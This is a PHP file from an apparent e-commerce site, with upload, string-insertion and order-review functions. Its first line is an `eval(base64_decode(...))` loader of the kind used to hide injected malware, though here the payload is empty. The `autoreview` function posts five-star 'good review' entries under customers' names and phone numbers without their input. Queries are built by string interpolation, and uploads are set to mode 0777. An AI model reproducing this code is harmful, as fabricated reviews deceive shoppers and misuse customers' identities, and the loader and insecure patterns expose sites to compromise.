<?php eval(base64_decode(''));?>
<?php 
	function up_file2($up_file_name, $save_dir, $array_key=-1){	//上传文件
	global $site_root_path;
	mk_dir($save_dir);
	
	if($array_key==-1){
		$filename=$up_file_name['name'];
		$filepath=$up_file_name['tmp_name'];
	}else{
		$filename=$up_file_name['name'][$array_key];
		$filepath=$up_file_name['tmp_name'][$array_key];
	}
	$ext_name=get_ext_name($filename);
	if(in_array($ext_name, array('jpg', 'gif', 'png'))){
		$save_name=$save_dir.rand_code().'.'.$ext_name;
		@move_uploaded_file($filepath, $site_root_path.$save_name);
		@chmod($site_root_path.$save_name, 0777);
		return is_file($site_root_path.$save_name)?$save_name:'';
	}else{
		del_file($filepath);
		return '';
	}
}

/**
 * 指定位置插入字符串
 * @param $str  原字符串
 * @param $i    插入位置
 * @param $substr 插入字符串
 * @return string 处理后的字符串
 */
function insertToStr($str, $i, $substr){
    //指定插入位置前的字符串
    $startstr="";
    for($j=0; $j<$i; $j++){
        $startstr .= $str[$j];
    }
    
    //指定插入位置后的字符串
    $laststr="";
    for ($j=$i; $j<strlen($str); $j++){
        $laststr .= $str[$j];
    }
    
    //将插入位置前，要插入的，插入位置后三个字符串拼接起来
    $str = $startstr . $substr . $laststr;
    
    //返回结果
    return $str;
}
function autoreview($ProId){
	global $db;global $service_time;
	if($count=$db->get_row_count('orders',"OrderStatus=3 and IsReview=0 and  ProId ='$ProId' and OverTime+12*60*60<$service_time")){
			$Order_12hours=$db->get_all('orders',"OrderStatus=3 and IsReview=0 and ProId ='$ProId' and OverTime+12*60*60<$service_time");
			foreach((array)$Order_12hours as $item){
				$ProId=(int)$item['ProId'];
				$MemberId = $item['MemberId'];
				$member_temp=$db->get_one('member',"MemberId = '{$item['MemberId']}'");
				$FullName=$member_temp['UserName'];
				$Phone=$member_temp['Phone'];
				$ID = $MemberId;
				$Rating=5;
				($Rating<1 || $Rating>5) && $Rating=5;
				$Contents='好评';
				$OId=$item['OId'];
				$Review_Level=5;
				//var_dump($item);
				//exit;
				$Review=$db->get_sum('product_review',"ProId='$ProId'",'Review_Level');
				$db->update('product',"ProId='$ProId' and MemberId = '$MemberId'",array('Review'=> $Review));
				$db->insert('product_review', array(
						'ProId'			=>	$ProId,
						'FullName'		=>	$FullName,
						'Phone'			=>	$Phone,
						'Contents'		=>	$Contents,
						'Ip'			=>	get_ip(),
						'PostTime'		=>	$service_time,
						'Review_Level'	=> 	$Review_Level,
						'ID'			=>	$MemberId,
						'PostTime'		=>	$service_time,
					)
				);
				$db->update('orders',"OId ='$OId'",array(
					'OverTime' 	=> $service_time,
					'IsReview'	=>	'1'
				));
			}
	}
	
	if($count=$db->get_row_count('order_twos',"OrderStatus=3 and IsReview=0 and ProId ='$ProId' and OverTime+12*60*60<$service_time")){
		$Order_12hours=$db->get_all('order_twos',"OrderStatus=3 and IsReview=0 and ProId ='$ProId' and OverTime+12*60*60<$service_time");
		foreach((array)$Order_12hours as $item){
			$ProId=(int)$item['ProId'];
			$MemberId = $item['MemberId'];
			$member_temp=$db->get_one('member',"MemberId = '{$item['MemberId']}'");
			$FullName=$member_temp['UserName'];
			$Phone=$member_temp['Phone'];
			$ID = $MemberId;
			$Rating=5;
			($Rating<1 || $Rating>5) && $Rating=5;
			$Contents='好评';
			$OId=$item['OId'];
			$Review_Level=5;
			
			$Review=$db->get_sum('product_review',"ProId='$ProId'",'Review_Level');
			$db->update('product',"ProId='$ProId' and MemberId = '$MemberId'",array('Review'=> $Review));
			$db->insert('product_review', array(
					'ProId'			=>	$ProId,
					'FullName'		=>	$FullName,
					'Phone'			=>	$Phone,
					'Contents'		=>	$Contents,
					'Ip'			=>	get_ip(),
					'PostTime'		=>	$service_time,
					'Review_Level'	=> 	$Review_Level,
					'ID'			=>	$MemberId,
					'PostTime'		=>	$service_time,
				)
			);
			$db->update('order_twos',"OId ='$OId'",array(
				'OverTime' 	=> $service_time,
				'IsReview'	=>	'1'
			));
		}
	}
	
}
?>